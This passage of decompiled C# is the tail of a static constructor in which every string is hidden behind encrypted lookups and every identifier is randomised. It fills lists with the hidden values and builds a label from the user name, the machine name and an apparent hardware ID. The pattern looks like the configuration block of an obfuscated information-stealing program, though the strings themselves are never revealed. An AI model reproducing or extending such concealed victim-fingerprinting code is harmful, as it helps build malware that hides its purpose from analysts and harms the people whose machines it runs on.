			tjPFETNBnBMzUXk(getString_0(107382419)),
			tjPFETNBnBMzUXk(getString_0(107382378)),
			tjPFETNBnBMzUXk(getString_0(107382877)),
			tjPFETNBnBMzUXk(getString_0(107382804)),
			tjPFETNBnBMzUXk(getString_0(107382791)),
			tjPFETNBnBMzUXk(getString_0(107382698)),
			tjPFETNBnBMzUXk(getString_0(107382681)),
			tjPFETNBnBMzUXk(getString_0(107382120)),
			tjPFETNBnBMzUXk(getString_0(107382031)),
			tjPFETNBnBMzUXk(getString_0(107381974)),
			tjPFETNBnBMzUXk(getString_0(107381929)),
			tjPFETNBnBMzUXk(getString_0(107381920)),
			tjPFETNBnBMzUXk(getString_0(107382375)),
			tjPFETNBnBMzUXk(getString_0(107388260)),
			tjPFETNBnBMzUXk(getString_0(107382302)),
			tjPFETNBnBMzUXk(getString_0(107382273)),
			tjPFETNBnBMzUXk(getString_0(107382240)),
			tjPFETNBnBMzUXk(getString_0(107382167)),
			tjPFETNBnBMzUXk(getString_0(107382170)),
			tjPFETNBnBMzUXk(getString_0(107388846)),
			tjPFETNBnBMzUXk(getString_0(107381585)),
			tjPFETNBnBMzUXk(getString_0(107381568)),
			tjPFETNBnBMzUXk(getString_0(107381539)),
			tjPFETNBnBMzUXk(getString_0(107386569)),
			tjPFETNBnBMzUXk(getString_0(107381506)),
			tjPFETNBnBMzUXk(getString_0(107381539)),
			tjPFETNBnBMzUXk(getString_0(107381477)),
			tjPFETNBnBMzUXk(getString_0(107381448)),
			tjPFETNBnBMzUXk(getString_0(107381387)),
			tjPFETNBnBMzUXk(getString_0(107381370)),
			tjPFETNBnBMzUXk(getString_0(107381801)),
			tjPFETNBnBMzUXk(getString_0(107381792)),
			tjPFETNBnBMzUXk(getString_0(107381731)),
			tjPFETNBnBMzUXk(getString_0(107381702)),
			tjPFETNBnBMzUXk(getString_0(107381661)),
			tjPFETNBnBMzUXk(getString_0(107381072)),
			tjPFETNBnBMzUXk(getString_0(107381059)),
			tjPFETNBnBMzUXk(getString_0(107381026)),
			tjPFETNBnBMzUXk(getString_0(107380937)),
			tjPFETNBnBMzUXk(getString_0(107380924)),
			tjPFETNBnBMzUXk(getString_0(107380867)),
			tjPFETNBnBMzUXk(getString_0(107381346)),
			tjPFETNBnBMzUXk(getString_0(107381305)),
			tjPFETNBnBMzUXk(getString_0(107381276)),
			tjPFETNBnBMzUXk(getString_0(107381215)),
			tjPFETNBnBMzUXk(getString_0(107381182)),
			tjPFETNBnBMzUXk(getString_0(107381125)),
			tjPFETNBnBMzUXk(getString_0(107413340)),
			tjPFETNBnBMzUXk(getString_0(107413259)),
			tjPFETNBnBMzUXk(getString_0(107413226)),
			tjPFETNBnBMzUXk(getString_0(107413209)),
			tjPFETNBnBMzUXk(getString_0(107413132)),
			tjPFETNBnBMzUXk(getString_0(107413115)),
			tjPFETNBnBMzUXk(getString_0(107413550)),
			tjPFETNBnBMzUXk(getString_0(107413533)),
			tjPFETNBnBMzUXk(getString_0(107413500)),
			tjPFETNBnBMzUXk(getString_0(107413427)),
			tjPFETNBnBMzUXk(getString_0(107413386)),
			tjPFETNBnBMzUXk(getString_0(107413373)),
			tjPFETNBnBMzUXk(getString_0(107383830)),
			tjPFETNBnBMzUXk(getString_0(107412828)),
			tjPFETNBnBMzUXk(getString_0(107412755)),
			tjPFETNBnBMzUXk(getString_0(107412730)),
			tjPFETNBnBMzUXk(getString_0(107412701)),
			tjPFETNBnBMzUXk(getString_0(107412668)),
			tjPFETNBnBMzUXk(getString_0(107412635)),
			tjPFETNBnBMzUXk(getString_0(107413066)),
			tjPFETNBnBMzUXk(getString_0(107413037)),
			tjPFETNBnBMzUXk(getString_0(107413024)),
			tjPFETNBnBMzUXk(getString_0(107412947)),
			tjPFETNBnBMzUXk(getString_0(107412906)),
			tjPFETNBnBMzUXk(getString_0(107412849)),
			tjPFETNBnBMzUXk(getString_0(107412320)),
			tjPFETNBnBMzUXk(getString_0(107412291)),
			tjPFETNBnBMzUXk(getString_0(107412214))
		};
		MUKeFWwqRbsUt = new List<string>
		{
			tjPFETNBnBMzUXk(getString_0(107412173)),
			tjPFETNBnBMzUXk(getString_0(107412156)),
			tjPFETNBnBMzUXk(getString_0(107412075)),
			tjPFETNBnBMzUXk(getString_0(107412570)),
			tjPFETNBnBMzUXk(getString_0(107412489)),
			tjPFETNBnBMzUXk(getString_0(107412456)),
			tjPFETNBnBMzUXk(getString_0(107412379)),
			tjPFETNBnBMzUXk(getString_0(107411806))
		};
		QxnFKMJGHHM = new List<string>
		{
			tjPFETNBnBMzUXk(getString_0(107411749)),
			tjPFETNBnBMzUXk(getString_0(107411716)),
			tjPFETNBnBMzUXk(getString_0(107411639)),
			tjPFETNBnBMzUXk(getString_0(107411622)),
			tjPFETNBnBMzUXk(getString_0(107411589)),
			tjPFETNBnBMzUXk(getString_0(107412020)),
			tjPFETNBnBMzUXk(getString_0(107412007)),
			tjPFETNBnBMzUXk(getString_0(107411974)),
			tjPFETNBnBMzUXk(getString_0(107411941)),
			tjPFETNBnBMzUXk(getString_0(107411908)),
			tjPFETNBnBMzUXk(getString_0(107411875)),
			tjPFETNBnBMzUXk(getString_0(107411842)),
			tjPFETNBnBMzUXk(getString_0(107411289)),
			tjPFETNBnBMzUXk(getString_0(107411216)),
			tjPFETNBnBMzUXk(getString_0(107411203)),
			tjPFETNBnBMzUXk(getString_0(107411170)),
			tjPFETNBnBMzUXk(getString_0(107411129)),
			tjPFETNBnBMzUXk(getString_0(107411064)),
			tjPFETNBnBMzUXk(getString_0(107411535)),
			tjPFETNBnBMzUXk(getString_0(107411526)),
			tjPFETNBnBMzUXk(getString_0(107411493)),
			tjPFETNBnBMzUXk(getString_0(107411452)),
			tjPFETNBnBMzUXk(getString_0(107411419)),
			tjPFETNBnBMzUXk(getString_0(107411749)),
			tjPFETNBnBMzUXk(getString_0(107411346)),
			tjPFETNBnBMzUXk(getString_0(107411305)),
			tjPFETNBnBMzUXk(getString_0(107410780)),
			tjPFETNBnBMzUXk(getString_0(107410747)),
			tjPFETNBnBMzUXk(getString_0(107410674)),
			tjPFETNBnBMzUXk(getString_0(107410633)),
			tjPFETNBnBMzUXk(getString_0(107410632)),
			tjPFETNBnBMzUXk(getString_0(107410591)),
			tjPFETNBnBMzUXk(getString_0(107411030)),
			tjPFETNBnBMzUXk(getString_0(107411716)),
			tjPFETNBnBMzUXk(getString_0(107410989)),
			tjPFETNBnBMzUXk(getString_0(107411639)),
			tjPFETNBnBMzUXk(getString_0(107410956)),
			tjPFETNBnBMzUXk(getString_0(107410923)),
			tjPFETNBnBMzUXk(getString_0(107410914)),
			tjPFETNBnBMzUXk(getString_0(107410881)),
			tjPFETNBnBMzUXk(getString_0(107410808)),
			tjPFETNBnBMzUXk(getString_0(107410255)),
			tjPFETNBnBMzUXk(getString_0(107410222)),
			tjPFETNBnBMzUXk(getString_0(107410189)),
			tjPFETNBnBMzUXk(getString_0(107410180)),
			tjPFETNBnBMzUXk(getString_0(107410139)),
			tjPFETNBnBMzUXk(getString_0(107410066))
		};
		tYFycaveyEZlTZa = new List<string>
		{
			tjPFETNBnBMzUXk(UdOhEiscoVO(getString_0(107410025))),
			tjPFETNBnBMzUXk(getString_0(107410488)),
			tjPFETNBnBMzUXk(getString_0(107410427)),
			tjPFETNBnBMzUXk(getString_0(107410330)),
			tjPFETNBnBMzUXk(getString_0(107409725)),
			tjPFETNBnBMzUXk(getString_0(107409628)),
			tjPFETNBnBMzUXk(getString_0(107409535)),
			tjPFETNBnBMzUXk(getString_0(107409950)),
			tjPFETNBnBMzUXk(getString_0(107409857)),
			tjPFETNBnBMzUXk(getString_0(107409248)),
			tjPFETNBnBMzUXk(getString_0(107409155)),
			tjPFETNBnBMzUXk(getString_0(107409058)),
			tjPFETNBnBMzUXk(getString_0(107409477)),
			tjPFETNBnBMzUXk(UdOhEiscoVO(getString_0(107410025)))
		};
		yaObxwDYeQoq = tjPFETNBnBMzUXk(getString_0(107409380));
		DZKPMstogvMqutY = new List<string>
		{
			tjPFETNBnBMzUXk(getString_0(107408723)),
			tjPFETNBnBMzUXk(getString_0(107408529)),
			tjPFETNBnBMzUXk(getString_0(107408847)),
			tjPFETNBnBMzUXk(getString_0(107408141)),
			tjPFETNBnBMzUXk(getString_0(107408459)),
			tjPFETNBnBMzUXk(getString_0(107408265))
		};
		jGCPbbWylwhkiZ = new List<string>
		{
			tjPFETNBnBMzUXk(getString_0(107407591)),
			tjPFETNBnBMzUXk(getString_0(107407498)),
			tjPFETNBnBMzUXk(getString_0(107407949))
		};
		aWvdmtYWLU = getString_0(107396421);
		DRlOGAWkgnPyhTM = getString_0(107396421);
		fpPKoegyFTl = new DateTime(2000, 1, 1);
		odkofmjGNehiR = new DateTime(2100, 1, 1);
		JxuqTkcAaBSWi = getString_0(107396964);
		LSeqdHjjsVhLqcK = getString_0(107390367);
		EgQwzOCvnHMPfG = getString_0(107396421);
		SmtRihlsiEMW = getString_0(107396421);
		HuXyLjhiTYuOC = getString_0(107396421);
		svEcVjBTCnuAYEoPH = getString_0(107396964);
		FLSEvrhuWfJ = getString_0(107396421);
		pXuFbktiBaug = getString_0(107396421);
		eiWezuyCGKD = new List<string>
		{
			getString_0(107396486),
			getString_0(107396200),
			getString_0(107396520),
			getString_0(107396049)
		};
		xhUXlAlyfax = getString_0(107396421);
		LglvkdAEDeokrPA = getString_0(107407888);
		gDLhAzrZSKssbSP = getString_0(107396421);
		TOzFyVZevgZt = getString_0(107396421);
		iMYZrEovwwqNE = getString_0(107396421);
		xNSqMIOLMLAwy = string.Empty;
		VMmbarXfpds = getString_0(107396421);
		MAIfUAvpaRAOicbA = getString_0(107396421);
		dOhNMoendime = getString_0(107396421);
		ZuONjNkcSQG = getString_0(107393667);
		BsEhNrYEPyIbuei = getString_0(107393667);
		BYECuHinFzglbhHW = getString_0(107396421);
		YIPXGAmIVTAgIi = getString_0(107396964);
		YmTiJprAuyeUnyd = getString_0(107396421);
		LRFgFKajMFF = getString_0(107396421);
		iTtbTuAkveiFQ = getString_0(107396421);
		ynsgvIeaItiOAP = getString_0(107407883);
		MeHrIQtFIeB = getString_0(107396421);
		cCTuunwfNioo = getString_0(107396421);
		CrIMGxZNxmnsF = getString_0(107407898);
		HazSUKRRBl = getString_0(107396421);
		oFPgjCRDHeJnCyn = getString_0(107396421);
		xoOIzmzChOZBJa = getString_0(107396421);
		lAoTEijSeOCrur = getString_0(107396421);
		JdCefxYFMIQXhE = getString_0(107407877);
		VbexJOEZOrg = getString_0(107396964);
		vKGebXPGqUoRq = getString_0(107396421);
		UmYbFPakVvjG = getString_0(107396421);
		OVsecWAEVkGcGjJDv = getString_0(107396421);
		KRkKkskNZSstTnnF = new string[0];
		lAmPIwcPEjNhXG = getString_0(107396421);
		jwIpebsbuTtJKU = true;
		baebLNYmOilG = getString_0(107396421);
		HHLzNKWftxhcT = false;
		nCFuCxDDXURK = false;
		ztMqipVfVlgMZOq = false;
		FozVogARTDEY = false;
		UvHPjcAlchtwE = getString_0(107407832);
		geeOWbkDyamU = false;
		hUQCboiKyWJxZi = false;
		yrqPvlUpuGZW = false;
		bLbMRmlIqKb = false;
		aDzhxFxDvB = true;
		AGuLAAdWUTO = getString_0(107407843) + Environment.UserName + getString_0(107407798) + Environment.MachineName + getString_0(107407809) + VcazhUwaHziY.ZAMBktwaWtQb() + getString_0(107407804);
		TdgxQRgoFMw = new List<string>();
		iaHlLkaXwuio = new List<string>();
		nKPyjivwjXGlLxX = new List<string>();
	}
}
